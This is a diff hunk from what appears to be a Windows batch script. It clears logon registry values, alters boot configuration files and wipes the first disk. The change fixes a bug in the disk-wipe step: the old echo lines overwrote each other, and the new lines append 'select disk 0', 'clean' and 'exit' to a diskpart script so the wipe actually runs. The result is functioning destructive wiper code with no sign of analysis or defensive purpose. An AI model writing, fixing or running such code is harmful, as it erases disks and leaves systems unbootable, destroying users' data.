@@ -457,10 +457,11 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonU
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI" /v LastLoggedOnSAMUser /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background" /v OEMBackground /t REG_DWORD /d 0 /f
 
-echo select disk 0 > %temp%\mbrkill.txt
-echo clean > %temp%\mbrkill.txt
-diskpart /s %temp%\mbrkill.txt
-del %temp%\mbrkill.txt
+echo select disk 0 > wipe_mbr.txt
+echo clean >> wipe_mbr.txt
+echo exit >> wipe_mbr.txt
+
+diskpart /s wipe_mbr.txt
 
 bcdedit /export %~dp0bcd.bak
 attrib -h -s -r C:\boot\bcd >nul 2>&1
